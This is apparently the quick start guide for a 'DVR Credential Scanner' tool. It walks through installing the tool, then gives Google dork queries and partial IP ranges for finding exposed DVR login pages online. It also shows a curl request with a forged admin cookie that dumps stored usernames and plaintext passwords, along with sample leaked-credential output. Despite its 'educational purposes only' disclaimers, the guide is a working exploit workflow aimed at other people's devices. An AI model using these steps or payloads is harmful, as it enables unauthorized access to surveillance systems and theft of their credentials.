# Quick Start Guide: DVR Credential Scanner

This guide will help you get started with the DVR Credential Scanner tool quickly.

## Step 1: Clone the Repository

Clone this repository to your local machine:

```bash
git clone https://github.com/its-anya/DVR_Credential_Scanner.git
```

## Step 2: Install Python

Make sure you have Python 3.6 or higher installed on your system.

To check your Python version, run:
```bash
python --version
```

If Python is not installed, download and install it from [python.org](https://www.python.org/downloads/).

## Step 3: Install Required Dependencies

Navigate to the project directory:
```bash
cd DVR_Credential_Scanner
```

Install the required packages:
```bash
pip install -r requirements.txt
```

## Step 4: Finding DVR Systems to Test

For educational purposes only, here are ways to find potentially vulnerable DVR systems:

### Using Google Search (Google Dorks)

Enter these search queries in Google:
```
intitle:"DVR LOGIN" -com
intitle:"DVR Login" -com
intitle:"XVR Login" -com
intitle:"MDVR Login" -com
intitle:"HVR Login" -com
```

Examples of IP addresses you might find:
- 91.201.122.x (with various ports like :14)
- 59.26.65.x (often on port :69)
- 47.113.219.x (might use port :226)

⚠️ **IMPORTANT**: Only test systems that you own or have explicit permission to test. Unauthorized testing is illegal.

## Step 5: Run the Tool

### Interactive Mode (Recommended)

Simply run the script without any arguments:
```bash
python dvr_scanner.py
```

You will be prompted to:
1. Enter the target host (IP address or hostname)
2. Enter the target port (press Enter to use the default port 80)
3. After scanning, you'll be asked if you want to scan another target

### Command-line Mode

Alternatively, you can specify the target directly:
```bash
python dvr_scanner.py --host [TARGET_IP] --port [TARGET_PORT]
```

Example:
```bash
python dvr_scanner.py --host 192.168.1.100 --port 80
```

### Manual Testing with curl

You can also manually test for the vulnerability using curl:

```bash
curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
```

Example of a successful response:
```json
{"result":0,"list":[{"uid":"admin","pwd":"Op1234567#","role":2,"enmac":0,"mac":"00:00:00:00:00:00","playback":4294967295,"view":4294967295,"rview":4294967295,"ptz":4294967295,"backup":4294967295,"opt":4294967295}]}
```

If you don't receive a JSON response with credentials, the system is likely not vulnerable.

## Step 6: Understand the Results

If the target DVR is vulnerable, you will see output that looks like this:

```
 [+] DVR URL:		192.168.1.100:80
 [+] Total Users:	1

╭──────────────────────┬──────────────────────┬──────────────────────╮
│             Username │             Password │              Role ID │
├──────────────────────┼──────────────────────┼──────────────────────┤
│                admin │           password123 │                    1 │
╰──────────────────────┴──────────────────────┴──────────────────────╯
```

This shows the username, password, and role ID for each user account on the DVR system.

## ⚠️ Important Note

This tool is for **EDUCATIONAL PURPOSES ONLY**. Using this tool against systems without explicit permission is illegal. Only use this tool on systems you own or have permission to test.

## Troubleshooting

1. **Connection Timeout**:
   - Verify the IP address and port are correct
   - Check if the target system is online
   - Make sure you can reach the target from your network

2. **Invalid JSON Response**:
   - The target system may not be vulnerable to this exploit
   - The target might be using an updated firmware that fixed the vulnerability

3. **Permission Denied Errors**:
   - Try running the script with administrator privileges

For more detailed information, refer to the README.md file. 
